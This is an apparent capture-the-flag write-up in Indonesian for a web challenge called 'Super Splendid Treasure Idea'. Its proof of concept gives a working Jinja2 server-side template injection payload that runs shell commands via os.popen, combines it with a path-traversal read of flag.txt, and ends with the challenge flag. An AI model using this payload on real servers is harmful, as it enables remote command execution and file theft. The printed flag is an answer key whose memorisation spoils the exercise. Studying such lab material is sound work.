## Super Splendid Treasure Idea

## Deskripsi

Rasanya tadi aku lihat flagnya di sini, tapi sekarang... hilang entah ke mana 😭. Apa ada yang mindahkannya? Mungkin aku harus mencoba menelusuri lebih dalam di website ini dan melihat apakah aku bisa menemukannya kembali.

Mungkin saja ada di balik beberapa file yang tersembunyi 🕵️‍♂️

## HINT
- Sepertinya judulnya menarik 🤔
- Deskripsinya juga menarik nih

## POC
- Masukin payload SSTI buat baca file atau os command
  {{"".join(cycler.__init__.__globals__.os.popen('cat flag.txt'))}}
- Lakuin sedikit LFI buat nemuin lokasi flagnya, yaitu ../../../../../../flag.txt
- Final payload -> {{"".join(cycler.__init__.__globals__.os.popen('cat ../../../../../../flag.txt')) }}

## Flag
CODEX2K24{H0H0H0_SSTI_w1th_s0me_LFI_ch4llenge_pr3tty_e4sy_r1ght}
